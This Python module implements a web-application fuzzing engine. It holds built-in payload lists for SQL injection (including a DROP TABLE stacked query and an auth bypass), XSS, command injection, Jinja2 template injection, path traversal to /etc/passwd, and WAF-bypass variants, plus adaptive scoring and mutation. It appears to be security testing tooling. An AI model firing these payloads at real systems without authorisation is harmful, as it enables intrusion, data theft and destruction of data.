"""Fuzzing strategy engine — intelligent input generation.

Implements:
1. Parameter fuzzing strategies
2. Mutation-based fuzzing
3. Grammar-based fuzzing
4. Protocol-aware fuzzing
5. Coverage-guided strategy selection
6. Payload generation and management
7. Interesting value identification
8. Feedback-driven payload evolution
"""

from __future__ import annotations

import random
import time
from collections import defaultdict
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

import structlog

logger = structlog.get_logger()


class FuzzStrategy(str, Enum):
    BOUNDARY = "boundary"         # Boundary values (0, -1, MAX_INT, etc.)
    FORMAT_STRING = "format_string"
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    SSTI = "ssti"
    LDAP_INJECTION = "ldap_injection"
    XML_INJECTION = "xml_injection"
    HEADER_INJECTION = "header_injection"
    UNICODE = "unicode"
    OVERFLOW = "overflow"


class PayloadCategory(str, Enum):
    DETECTION = "detection"       # Detect if vuln exists
    EXPLOITATION = "exploitation"  # Exploit confirmed vuln
    BYPASS = "bypass"             # Bypass filters/WAF
    BLIND = "blind"               # Blind detection (timing, OOB)


@dataclass
class FuzzPayload:
    """A single fuzz payload."""
    payload_id: str = ""
    strategy: FuzzStrategy = FuzzStrategy.BOUNDARY
    category: PayloadCategory = PayloadCategory.DETECTION
    value: str = ""
    description: str = ""
    encoding: str = "raw"        # raw, url, base64, double_url, unicode
    confidence: float = 0.5      # How likely this triggers a vuln
    bypass_level: int = 0        # 0=basic, 1=WAF bypass, 2=deep bypass

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.payload_id[:10],
            "strategy": self.strategy.value,
            "value": self.value[:30],
            "confidence": round(self.confidence, 2),
        }


@dataclass
class FuzzResult:
    """Result of a fuzz attempt."""
    payload_id: str = ""
    strategy: FuzzStrategy = FuzzStrategy.BOUNDARY
    target: str = ""
    parameter: str = ""
    status_code: int = 0
    response_time_ms: float = 0.0
    response_size: int = 0
    interesting: bool = False
    anomaly_type: str = ""       # What made it interesting
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> dict[str, Any]:
        return {
            "payload": self.payload_id[:10],
            "status": self.status_code,
            "interesting": self.interesting,
            "anomaly": self.anomaly_type[:15],
        }


# ── Payload databases ────────────────────────────────────────

SQL_PAYLOADS: list[dict[str, Any]] = [
    {"value": "'", "desc": "Single quote", "cat": "detection", "conf": 0.8},
    {"value": "\"", "desc": "Double quote", "cat": "detection", "conf": 0.6},
    {"value": "' OR '1'='1", "desc": "Classic OR bypass", "cat": "detection", "conf": 0.9},
    {"value": "' OR 1=1--", "desc": "OR with comment", "cat": "detection", "conf": 0.9},
    {"value": "'; DROP TABLE users--", "desc": "Stacked query", "cat": "exploitation", "conf": 0.7},
    {"value": "' UNION SELECT NULL--", "desc": "Union probe", "cat": "detection", "conf": 0.8},
    {"value": "' AND SLEEP(5)--", "desc": "Time-based blind", "cat": "blind", "conf": 0.9},
    {"value": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "desc": "Nested sleep", "cat": "blind", "conf": 0.8},
    {"value": "1' AND '1'='1", "desc": "Inline true", "cat": "detection", "conf": 0.7},
    {"value": "admin'--", "desc": "Auth bypass", "cat": "exploitation", "conf": 0.8},
    # WAF bypass variants
    {"value": "' /*!50000OR*/ '1'='1", "desc": "MySQL version comment bypass", "cat": "bypass", "conf": 0.6, "bypass": 1},
    {"value": "' %4fR '1'='1", "desc": "URL encoded OR", "cat": "bypass", "conf": 0.5, "bypass": 1},
    {"value": "'-IF(1=1,SLEEP(5),0)--", "desc": "IF-based blind", "cat": "blind", "conf": 0.7},
]

XSS_PAYLOADS: list[dict[str, Any]] = [
    {"value": "<script>alert(1)</script>", "desc": "Basic script tag", "cat": "detection", "conf": 0.9},
    {"value": "<img src=x onerror=alert(1)>", "desc": "Event handler", "cat": "detection", "conf": 0.9},
    {"value": "<svg onload=alert(1)>", "desc": "SVG onload", "cat": "detection", "conf": 0.8},
    {"value": "javascript:alert(1)", "desc": "JS protocol", "cat": "detection", "conf": 0.7},
    {"value": "\"><script>alert(1)</script>", "desc": "Break out of attribute", "cat": "detection", "conf": 0.9},
    {"value": "'-alert(1)-'", "desc": "In JS context", "cat": "detection", "conf": 0.6},
    {"value": "{{7*7}}", "desc": "Template injection probe", "cat": "detection", "conf": 0.8},
    # WAF bypass
    {"value": "<scr<script>ipt>alert(1)</scr</script>ipt>", "desc": "Nested tag bypass", "cat": "bypass", "conf": 0.5, "bypass": 1},
    {"value": "<img src=x onerror=&#97;lert(1)>", "desc": "HTML entity bypass", "cat": "bypass", "conf": 0.6, "bypass": 1},
    {"value": "<svg/onload=alert(1)>", "desc": "No space bypass", "cat": "bypass", "conf": 0.7, "bypass": 1},
]

CMDI_PAYLOADS: list[dict[str, Any]] = [
    {"value": "; id", "desc": "Semicolon chain", "cat": "detection", "conf": 0.9},
    {"value": "| id", "desc": "Pipe", "cat": "detection", "conf": 0.9},
    {"value": "|| id", "desc": "OR chain", "cat": "detection", "conf": 0.8},
    {"value": "& id", "desc": "Background", "cat": "detection", "conf": 0.8},
    {"value": "`id`", "desc": "Backtick", "cat": "detection", "conf": 0.8},
    {"value": "$(id)", "desc": "Dollar subshell", "cat": "detection", "conf": 0.8},
    {"value": "; sleep 5", "desc": "Time-based blind", "cat": "blind", "conf": 0.9},
    {"value": "| sleep 5", "desc": "Pipe sleep blind", "cat": "blind", "conf": 0.9},
    # Bypass
    {"value": ";{id}", "desc": "Brace bypass", "cat": "bypass", "conf": 0.5, "bypass": 1},
    {"value": "';${IFS}id", "desc": "IFS bypass spaces", "cat": "bypass", "conf": 0.6, "bypass": 1},
]

SSTI_PAYLOADS: list[dict[str, Any]] = [
    {"value": "{{7*7}}", "desc": "Math probe", "cat": "detection", "conf": 0.9},
    {"value": "${7*7}", "desc": "Dollar math probe", "cat": "detection", "conf": 0.8},
    {"value": "#{7*7}", "desc": "Hash math probe", "cat": "detection", "conf": 0.7},
    {"value": "<%= 7*7 %>", "desc": "ERB probe", "cat": "detection", "conf": 0.7},
    {"value": "{{''.__class__.__mro__[1].__subclasses__()}}", "desc": "Jinja2 class traverse", "cat": "exploitation", "conf": 0.8},
    {"value": "{{config}}", "desc": "Jinja2 config leak", "cat": "exploitation", "conf": 0.7},
]

PATH_PAYLOADS: list[dict[str, Any]] = [
    {"value": "../../../etc/passwd", "desc": "Classic traversal", "cat": "detection", "conf": 0.9},
    {"value": "....//....//....//etc/passwd", "desc": "Double dot bypass", "cat": "bypass", "conf": 0.7, "bypass": 1},
    {"value": "..%252f..%252f..%252fetc/passwd", "desc": "Double URL encode", "cat": "bypass", "conf": 0.6, "bypass": 1},
    {"value": "/etc/passwd%00.png", "desc": "Null byte bypass", "cat": "bypass", "conf": 0.5, "bypass": 1},
    {"value": "..\\..\\..\\windows\\win.ini", "desc": "Windows traversal", "cat": "detection", "conf": 0.8},
]

BOUNDARY_PAYLOADS: list[dict[str, Any]] = [
    {"value": "0", "desc": "Zero", "cat": "detection", "conf": 0.3},
    {"value": "-1", "desc": "Negative one", "cat": "detection", "conf": 0.4},
    {"value": "2147483647", "desc": "INT_MAX", "cat": "detection", "conf": 0.5},
    {"value": "-2147483648", "desc": "INT_MIN", "cat": "detection", "conf": 0.5},
    {"value": "9999999999999999999", "desc": "Huge number", "cat": "detection", "conf": 0.4},
    {"value": "A" * 5000, "desc": "Long string 5000", "cat": "detection", "conf": 0.5},
    {"value": "A" * 100000, "desc": "Long string 100K", "cat": "detection", "conf": 0.4},
    {"value": "", "desc": "Empty string", "cat": "detection", "conf": 0.3},
    {"value": " ", "desc": "Whitespace only", "cat": "detection", "conf": 0.3},
    {"value": "null", "desc": "Null string", "cat": "detection", "conf": 0.4},
    {"value": "undefined", "desc": "Undefined string", "cat": "detection", "conf": 0.3},
    {"value": "true", "desc": "Boolean true", "cat": "detection", "conf": 0.3},
    {"value": "[]", "desc": "Empty array", "cat": "detection", "conf": 0.4},
    {"value": "{}", "desc": "Empty object", "cat": "detection", "conf": 0.4},
    {"value": "\x00", "desc": "Null byte", "cat": "detection", "conf": 0.5},
]


# Aggregate all payloads by strategy
PAYLOAD_DB: dict[FuzzStrategy, list[dict[str, Any]]] = {
    FuzzStrategy.SQL_INJECTION: SQL_PAYLOADS,
    FuzzStrategy.XSS: XSS_PAYLOADS,
    FuzzStrategy.COMMAND_INJECTION: CMDI_PAYLOADS,
    FuzzStrategy.SSTI: SSTI_PAYLOADS,
    FuzzStrategy.PATH_TRAVERSAL: PATH_PAYLOADS,
    FuzzStrategy.BOUNDARY: BOUNDARY_PAYLOADS,
}


class FuzzingStrategyEngine:
    """Intelligent fuzzing strategy engine.

    Generates and manages fuzz payloads, tracks results,
    and adapts strategy based on feedback.
    """

    def __init__(self) -> None:
        self._payloads: dict[str, FuzzPayload] = {}
        self._results: list[FuzzResult] = []
        self._strategy_scores: dict[str, dict[str, float]] = defaultdict(lambda: defaultdict(float))
        self._counter = 0
        self._log = logger.bind(component="fuzzing_strategy")
        self._load_payloads()

    def _load_payloads(self) -> None:
        """Load all payload databases."""
        for strategy, payloads in PAYLOAD_DB.items():
            for data in payloads:
                self._counter += 1
                payload = FuzzPayload(
                    payload_id=f"fuzz-{self._counter}",
                    strategy=strategy,
                    category=PayloadCategory(data.get("cat", "detection")),
                    value=data["value"],
                    description=data.get("desc", ""),
                    confidence=data.get("conf", 0.5),
                    bypass_level=data.get("bypass", 0),
                )
                self._payloads[payload.payload_id] = payload

    def get_payloads(
        self,
        strategy: FuzzStrategy | None = None,
        category: PayloadCategory | None = None,
        max_bypass_level: int = 0,
        max_count: int = 20,
    ) -> list[FuzzPayload]:
        """Get payloads filtered by criteria."""
        results = []
        for payload in self._payloads.values():
            if strategy and payload.strategy != strategy:
                continue
            if category and payload.category != category:
                continue
            if payload.bypass_level > max_bypass_level:
                continue
            results.append(payload)
            if len(results) >= max_count:
                break
        return results

    def get_adaptive_payloads(
        self,
        target: str,
        parameter: str,
        max_count: int = 15,
    ) -> list[FuzzPayload]:
        """Get payloads adapted based on past results."""
        # Check which strategies have been successful
        target_key = f"{target}:{parameter}"
        scores = self._strategy_scores.get(target_key, {})

        all_payloads = list(self._payloads.values())

        if scores:
            # Prioritize strategies that have been successful
            def score_fn(p: FuzzPayload) -> float:
                base = p.confidence
                bonus = scores.get(p.strategy.value, 0)
                return base + bonus
            all_payloads.sort(key=score_fn, reverse=True)
        else:
            # Shuffle for exploration
            random.shuffle(all_payloads)

        return all_payloads[:max_count]

    def record_result(
        self,
        payload_id: str,
        target: str,
        parameter: str,
        status_code: int,
        response_time_ms: float = 0.0,
        response_size: int = 0,
        interesting: bool = False,
        anomaly_type: str = "",
    ) -> FuzzResult:
        """Record a fuzz attempt result."""
        payload = self._payloads.get(payload_id)
        strategy = payload.strategy if payload else FuzzStrategy.BOUNDARY

        result = FuzzResult(
            payload_id=payload_id,
            strategy=strategy,
            target=target,
            parameter=parameter,
            status_code=status_code,
            response_time_ms=response_time_ms,
            response_size=response_size,
            interesting=interesting,
            anomaly_type=anomaly_type,
        )
        self._results.append(result)

        # Update strategy scores
        if interesting:
            target_key = f"{target}:{parameter}"
            self._strategy_scores[target_key][strategy.value] += 0.1

        return result

    def get_interesting_results(self) -> list[FuzzResult]:
        """Get all interesting fuzz results."""
        return [r for r in self._results if r.interesting]

    def mutate_payload(self, payload: FuzzPayload) -> FuzzPayload:
        """Create a mutated version of a payload."""
        mutations = [
            lambda v: v.upper(),
            lambda v: v.lower(),
            lambda v: v.replace(" ", "/**/"),     # Comment bypass
            lambda v: v.replace(" ", "%20"),       # URL encode spaces
            lambda v: v + "\n",                    # Newline append
            lambda v: v[::-1],                     # Reverse
            lambda v: "".join(f"%{ord(c):02x}" if c.isalpha() else c for c in v[:20]),  # URL encode
        ]

        mutation = random.choice(mutations)
        mutated_value = mutation(payload.value)

        self._counter += 1
        return FuzzPayload(
            payload_id=f"fuzz-m-{self._counter}",
            strategy=payload.strategy,
            category=payload.category,
            value=mutated_value,
            description=f"Mutated: {payload.description}",
            confidence=payload.confidence * 0.8,
            bypass_level=payload.bypass_level + 1,
        )

    def get_stats(self) -> dict[str, Any]:
        strategy_counts: dict[str, int] = defaultdict(int)
        for p in self._payloads.values():
            strategy_counts[p.strategy.value] += 1

        interesting = len(self.get_interesting_results())
        total = len(self._results)

        return {
            "payloads": len(self._payloads),
            "results": total,
            "interesting": interesting,
            "interesting_rate": round(interesting / max(1, total), 3),
            "by_strategy": dict(strategy_counts),
        }
